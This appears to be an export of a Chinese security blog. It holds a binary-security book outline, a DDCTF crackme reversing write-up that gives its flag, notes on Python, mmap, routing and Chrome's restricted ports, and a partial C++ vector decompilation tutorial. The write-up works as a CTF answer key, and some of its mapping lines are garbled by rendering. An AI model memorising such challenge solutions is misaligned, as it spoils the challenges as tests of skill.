    <content><![CDATA[<p>第一节：二进制安全概述<br>第二节：基础知识<br>2.1 什么是软件<br>2.2 什么是恶意软件<br>2.2.1 潜藏广告<br>2.2.2 木马<br>2.2.3 病毒<br>2.2.4 后门软件<br>2.3 什么是漏洞<br>2.3.1 poc是什么<br>2.3.2 exp是什么<br>2.4 虚拟环境<br>2.4.1 沙盒<br>2.4.2 虚拟机<br>2.5 分析手法<br>2.5.1 静态分析<br>2.5.2 动态分析<br>第三节：二进制安全应用<br>3.1 二进制层面的攻击<br>3.1.1 软件的破解<br>3.1.2 制作二进制层面的恶意软件<br>3.1.3 利用软件漏洞攻击<br>3.2 二进制层面的防御<br>3.2.1 软件的安全防护<br>3.2.1 恶意软件的防护<br>3.2.1 软件漏洞的预防<br>第四节： 常见安全场景<br>4.1 windows安全<br>4.2 移动安全<br>4.2.1 安卓安全<br>4.2.2 ios安全<br>第五节： 二进制层面的安全防护<br>5.1 基础级别防护<br>5.1.1 安装杀毒软件<br>5.1.2 下载方式的选择<br>5.1.3 未知软件的处理<br>5.2 进阶防护<br>5.2.1 利用工具分析未知软件<br>5.2.2 根据行为判别软件类别<br>5.2.3 虚拟环境洞察软件行为<br>5.2.4 应对处理措施</p><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/18d025c7/">https://noone-hub.github.io/posts/18d025c7/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>书籍目录</tag>
      </tags>
  </entry>
  <entry>
    <title>滴滴ctf_re1,2</title>
    <url>/posts/a657c435/</url>
    <content><![CDATA[<h1 id="DDCTF之re1详解"><a href="#DDCTF之re1详解" class="headerlink" title="DDCTF之re1详解"></a>DDCTF之re1详解</h1><p>前言：re1,可能我的是非预期解法吧，re2的话，可能也是非预期吧，不过做出来过后感觉这两道都蛮简单的，不会做的时候就是个傻子。。。</p><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>用ida打开这个程序，出现upx1,明显upx壳，linux下我用upx -d filename 脱了壳后。我先把ida出来的flag复制提交了下，没用。。。然后开始看算法，</p><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+4h] [ebp-804h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+5h] [ebp-803h]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [esp+404h] [ebp-404h]</span></span><br><span class="line">  <span class="keyword">char</span> Dst; <span class="comment">// [esp+405h] [ebp-403h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0x3FF</span>u);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v5, <span class="number">0</span>, <span class="number">0x3FF</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"please input code:"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;v6);</span><br><span class="line">  sub_401000(&amp;v6);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;v4, <span class="string">"DDCTF&#123;reverseME&#125;"</span>) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"You've got it!!%s\n"</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Try again later.\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个过程很明朗，没有挖坑，关键函数就在sub_401000处，进去后</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_401000</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  result = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = a1 - v1;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *v1 = byte_402FF8[(<span class="keyword">char</span>)v1[v4]];</span><br><span class="line">      ++v2;</span><br><span class="line">      ++v1;</span><br><span class="line">      result = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v2 &lt; result );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>…我发觉a1 - v1这是什么鬼，a1不是地址吗，v1又是什么鬼。。抱着一堆什么鬼都不知道的东西，我就直接上od了，因为这是windows逆向，所以我还是比较擅长动态调试的，大一一年几乎都是在啃汇编啃od,当时都不知道ida这玩意。</p><p>调试环境：吾爱虚拟机</p><p>工具：吾爱的OD</p><p>感觉像是为吾爱打了一波广告，哈哈，没关系，反正我也是论坛成员，宣传下没什么毛病<br>打开od载入程序后，点播放按钮，也就是运行按钮，然后右键中文搜索，搜索字符串，来到这里</p><p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2blu5vzhij319y0jgmxw.jpg" alt="2"></p><p>在定位到关键点please input code<br>这里很容易看出ida的逻辑，scanf后跟着的一个call便是关键，在此call处下断点，</p><p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2blucw5inj31hc0sj77u.jpg" alt="3"></p><p>然后输入12345678,</p><p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2blui7pb2j31hc0sj77t.jpg" alt="4"></p><p>成功断下，然后F7单步进入,在单步跟了一轮过后，我发觉pop这里有好东西<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2blunfdy7j31hc0sjtc5.jpg" alt="6"><br>看堆栈窗口，也就是右下角，出现了跟我输入字符串一样长度的英文字符串，起初我也没在意，然后输入多几次后发觉，每次输入是对应的，也就是说，他跟凯撒密码类似，他只是移了下位，然后，我自己手动把键盘里所有出现的字符输入了一遍，发觉还是漏了一些，找不齐，最终就利用他本身含有的一个字符串进行输入，得到每个的对应字符串，他的字符串可以从od里直接看到<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2bluu4xyaj31hc0sj77l.jpg" alt="7"><br>或者从ida里都可以找到<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2bluykzzgj30wi04pq3x.jpg" alt="8"><br>然后进行手动输入进行匹配，我需要的DDCTF{reverse}<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2blv2f2a7j31hc0sjwi3.jpg" alt="9"><br>看栈窗口，最上面的对应匹配，我这样手动把每个字符对应起来，就得到flag了<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2blv7l7y4j31hc0sjwi2.jpg" alt="10"><br>最终得到对应字符<br>Z D<br>[ C<br>J T<br>, r<br>9 e<br>( v</p><ul><li>s<h1><a href="#" class="headerlink" title="{"></a>{</h1>! }<br>X F</li></ul><p>手动得到ZZ[JX#,9(9,+9!</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/a657c435/">https://noone-hub.github.io/posts/a657c435/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>about_me</tag>
      </tags>
  </entry>
  <entry>
    <title>基础待补充</title>
    <url>/posts/fc164dcc/</url>
    <content><![CDATA[<h1 id="base"><a href="#base" class="headerlink" title="base"></a>base</h1><h2 id="python负数转16进制"><a href="#python负数转16进制" class="headerlink" title="python负数转16进制"></a>python负数转16进制</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">-1</span> &amp; <span class="number">0xffffffff</span>)</span><br><span class="line"><span class="string">'0xffffffff'</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>pack(<span class="number">-1</span>,<span class="number">32</span>,<span class="string">'little'</span>,<span class="literal">True</span>)</span><br><span class="line"><span class="string">'\xff\xff\xff\xff'</span></span><br></pre></td></tr></table></figure><h2 id="mmap-prot参数"><a href="#mmap-prot参数" class="headerlink" title="mmap prot参数"></a>mmap prot参数</h2><table><thead><tr><th>可执行(x)</th><th>可写(w)</th><th>可读(r)</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>1</td></tr></tbody></table><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><h2 id="路由配置"><a href="#路由配置" class="headerlink" title="路由配置"></a>路由配置</h2><p>sudo route add -net 192.25.0.0 netmask 255.255.0.0 gw 192.168.0.134</p><p>网关是目的ip，转发目的地<br>192.25.0.0 加netmask 255.255.0.0是</p><h2 id="谷歌浏览器端口黑名单"><a href="#谷歌浏览器端口黑名单" class="headerlink" title="谷歌浏览器端口黑名单"></a>谷歌浏览器端口黑名单</h2><p>1, // tcpmux<br>7, // echo<br>9, // discard<br>11, // systat<br>13, // daytime<br>15, // netstat<br>17, // qotd<br>19, // chargen<br>20, // ftp data<br>21, // ftp access<br>22, // ssh<br>23, // telnet<br>25, // smtp<br>37, // time<br>42, // name<br>43, // nicname<br>53, // domain<br>77, // priv-rjs<br>79, // finger<br>87, // ttylink<br>95, // supdup<br>101, // hostriame<br>102, // iso-tsap<br>103, // gppitnp<br>104, // acr-nema<br>109, // pop2<br>110, // pop3<br>111, // sunrpc<br>113, // auth<br>115, // sftp<br>117, // uucp-path<br>119, // nntp<br>123, // NTP<br>135, // loc-srv /epmap<br>139, // netbios<br>143, // imap2<br>179, // BGP<br>389, // ldap<br>465, // smtp+ssl<br>512, // print / exec<br>513, // login<br>514, // shell<br>515, // printer<br>526, // tempo<br>530, // courier<br>531, // chat<br>532, // netnews<br>540, // uucp<br>556, // remotefs<br>563, // nntp+ssl<br>587, // stmp?<br>601, // ??<br>636, // ldap+ssl<br>993, // ldap+ssl<br>995, // pop3+ssl<br>2049, // nfs<br>3659, // apple-sasl / PasswordServer<br>4045, // lockd<br>6000, // X11<br>6665, // Alternate IRC [Apple addition]<br>6666, // Alternate IRC [Apple addition]<br>6667, // Standard IRC [Apple addition]<br>6668, // Alternate IRC [Apple addition]<br>6669, // Alternate IRC [Apple addition]</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/fc164dcc/">https://noone-hub.github.io/posts/fc164dcc/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title>C++_vector_reverse</title>
    <url>/posts/6e2e265a/</url>
    <content><![CDATA[<h1 id="C-逆向之容器vector篇入门（本文首发于安全客）"><a href="#C-逆向之容器vector篇入门（本文首发于安全客）" class="headerlink" title="C++逆向之容器vector篇入门（本文首发于安全客）"></a>C++逆向之容器vector篇入门（本文首发于安全客）</h1><p>前言：说实话，我自己也不会c++的逆向。然后，现在太多的题目是c++的逆向了，一上来就是一堆容器，搞得我不得不去补补c++逆向部分的知识了，我这篇文章以西湖论剑的easyCpp为例，希望能给那些跟我一样是c++逆向的新手的朋友们一点启发。下面我就开始我的抛砖引玉篇幅吧，在这篇文章里，我会以题目中出现的逆向出来的代码以及C++的代码进行对比，让你们更好的知道，c++容器入门篇其实不难，开始正文：</p><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><p>我将先给你们介绍每个容器操作的代码以及ida反汇编出来的代码进行对比</p><h2 id="vector的构造以及析构"><a href="#vector的构造以及析构" class="headerlink" title="vector的构造以及析构"></a>vector的构造以及析构</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//声明一个int型向量</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test1;</span><br><span class="line">    getchar();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//声明一个初始大小为5的int向量</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test2(<span class="number">5</span>);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//声明一个初始大小为10且值都是1的向量</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test3(<span class="number">10</span>,<span class="number">1</span>);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//声明并用num向量初始化test4向量</span></span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test4(num);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//用向量vec的第0个到第9个值初始化test3</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test5(test3.begin(), test3.end());</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将arr[1]~arr[4]范围内的元素作为vec的初始值</span></span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">array</span>[<span class="number">5</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test6(&amp;<span class="built_in">array</span>[<span class="number">1</span>], &amp;<span class="built_in">array</span>[<span class="number">4</span>]);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是C++代码，接下来是ida F5出现的代码</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [rsp+0h] [rbp-100h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+20h] [rbp-E0h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+24h] [rbp-DCh]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+28h] [rbp-D8h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+2Ch] [rbp-D4h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+30h] [rbp-D0h]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+40h] [rbp-C0h]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [rsp+60h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [rsp+80h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [rsp+A0h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [rsp+C0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [rsp+E2h] [rbp-1Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [rsp+E3h] [rbp-1Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [rsp+E4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [rsp+E9h] [rbp-17h]</span></span><br><span class="line">  <span class="keyword">char</span> v21; <span class="comment">// [rsp+EAh] [rbp-16h]</span></span><br><span class="line">  <span class="keyword">char</span> v22; <span class="comment">// [rsp+EBh] [rbp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> v23; <span class="comment">// [rsp+ECh] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个vector</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v16, argv, envp);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建初始容量大小为5的vector</span></span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(&amp;v17);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v15, <span class="number">5L</span>L, &amp;v17);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(&amp;v17);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建初始容量大小为10并且将元素初始化为1的vector</span></span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(&amp;v18);</span><br><span class="line">  v19 = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v14, <span class="number">10L</span>L, &amp;v19, &amp;v18);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(&amp;v18);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line"><span class="comment">//声明并用num向量初始化test4向量</span></span><br><span class="line">  v23 = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(&amp;v20);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v13, v23, &amp;v20);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(&amp;v20);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(&amp;v21);</span><br><span class="line">  v3 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end(&amp;v14);</span><br><span class="line">  v4 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v14);</span><br><span class="line">  <span class="comment">//这两句在c++中相当于v14.begin()以及v14.end()</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//这句看着很长，其实也就是构造函数，将::提取出来就可以看出std::vector&lt;...&gt;::vector&lt;...&gt;(...)</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="keyword">void</span>&gt;(</span><br><span class="line">    &amp;v12,</span><br><span class="line">    v4,</span><br><span class="line">    v3,</span><br><span class="line">    &amp;v21);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(&amp;v21);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  v7 = <span class="number">1</span>;</span><br><span class="line">  v8 = <span class="number">2</span>;</span><br><span class="line">  v9 = <span class="number">3</span>;</span><br><span class="line">  v10 = <span class="number">4</span>;</span><br><span class="line">  v11 = <span class="number">5</span>;</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(&amp;v22);</span><br><span class="line">  <span class="comment">//将arr[1]~arr[4]范围内的元素作为vec的初始值，v8为数组下标为1的元素，v11为最后一个</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>&lt;<span class="keyword">int</span> *,<span class="keyword">void</span>&gt;(&amp;v6, &amp;v8, &amp;v11, &amp;v22);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(&amp;v22);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v6);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v12);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v13);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v14);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v15);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v16);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><ul><li>从代码里可以看出，在ida的识别世界里，他会先创建一个临时变量，然后将他的地址传到vector的构造函数里</li><li>而不同的vector构造函数，只是参数不同，第二个为初始容量，第三个为初始数值的地址，第四个为allocator用于分配内存</li><li>可以看出构造函数和析构函数是同时存在的</li><li>要学会简化所识别出来的C++代码，括号里的模板类可以不仔细看，只需要看他具体是什么函数就行</li></ul><p><strong>重点</strong>：<br>v3 = std::vector&lt;int,std::allocator<int>&gt;::end(&amp;v14);<br>v4 = std::vector&lt;int,std::allocator<int>&gt;::begin(&amp;v14);<br>这两句要会识别，这是常用的，他是取容器的begin和end，相当于C++的v14.begin();v14.end();</int></int></p><h2 id="vector的常用操作识别"><a href="#vector的常用操作识别" class="headerlink" title="vector的常用操作识别"></a>vector的常用操作识别</h2><p>先进行vector操作知识的复习</p><p>vector对象最重要的几种操作</p><ol><li>v.push_back(t) 　　　　在容器的最后添加一个值为t的数据，容器的size变大。</li><li>v.size() 　 返回容器中数据的个数，size返回相应vector类定义的size_type的值。</li><li>v.empty() 　　　　　　判断vector是否为空</li><li>v[n] 或 v.at(n) 返回v中位置为n的元素，后者更加安全</li><li>v.insert(pointer,number, content) 向v中pointer指向的位置插入number个content的内容。<br>还有v. insert(pointer, content)，v.insert(pointer,a[2],a[4])将a[2]到a[4]三个元素插入。</li><li>v.pop_back() 删除容器的末元素，并不返回该元素。</li><li>v.erase(pointer1,pointer2) 删除pointer1到pointer2中间（包括pointer1所指）的元素。<br>vector中删除一个元素后，此位置以后的元素都需要往前移动一个位置，虽然当前迭代器位置没有自动加1，<br>但是由于后续元素的顺次前移，也就相当于迭代器的自动指向下一个位置一样。</li><li>v1==v2 判断v1与v2是否相等。</li><li>！=、&lt;、&lt;=、&gt;、&gt;= 保持这些操作符惯有含义。</li><li>vector<typename>::iterator p=v1.begin( ); p初始值指向v1的第一个元素。*p取所指向元素的值。<br>对于const vector<typename>只能用vector<typename>::const_iterator类型的指针访问。</typename></typename></typename></li><li>p=v1.end( ); p指向v1的最后一个元素的下一位置。</li><li>v.clear() 删除容器中的所有元素。</li><li>v.resize(2<em>v.size)或v.resize(2</em>v.size, 99)　　 将v的容量翻倍(并把新元素的值初始化为99)</li></ol><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test;</span><br><span class="line">    <span class="comment">//创建一个vector，并且将5个数值压入容器</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)</span><br><span class="line">        test.push_back(i);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//输出容器大小</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; test.size();</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除容器中最后的一个元素</span></span><br><span class="line">    test.pop_back();</span><br><span class="line">    getchar();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//判断容器是否为空，若非空，删除一个元素</span></span><br><span class="line">    <span class="keyword">if</span>(!test.empty())</span><br><span class="line">        test.pop_back();</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//重新设置容器大小并赋值</span></span><br><span class="line">    test.resize(<span class="number">5</span>, <span class="number">2</span>);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建一个新容器，并判断新容器跟旧容器是否相等</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test1(<span class="number">5</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(test1 == test)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"Right!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    getchar();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//将区间[first,last)的元素赋值到当前的vector容器中，或者赋n个值为x的元素到vector容器中，这个容器会清除掉vector容器中以前的内容</span></span><br><span class="line">    test1.assign(test.begin(), test.end());</span><br><span class="line">    getchar();</span><br><span class="line">    test.clear();</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以下是ida f5识别出来的代码，我相信很多新手看到这么多代码，已经开始晕了，不要紧，一步步给你分析下，我将每一步用getchar进行分割，方便你们看懂，你们自己调试的时候也可以这么做</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span 